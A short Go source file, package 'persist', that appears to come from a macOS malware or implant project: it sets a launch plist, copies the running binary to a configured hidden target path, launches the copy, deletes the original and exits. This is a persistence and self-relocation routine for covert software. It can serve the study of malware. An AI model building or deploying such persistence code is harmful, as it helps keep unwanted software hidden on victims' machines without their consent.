package persist

import(
  "path/filepath"
  "os"

  "../info"
  "../config"
)

func CheckAndExec(i *info.Info){
  setPlist(i)
  if(i.GetCurPath() != filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName)){
    moveToTarget(i)
    execTarget(i)
    os.Remove(i.GetCurPath())
    os.Exit(0)
  }
}
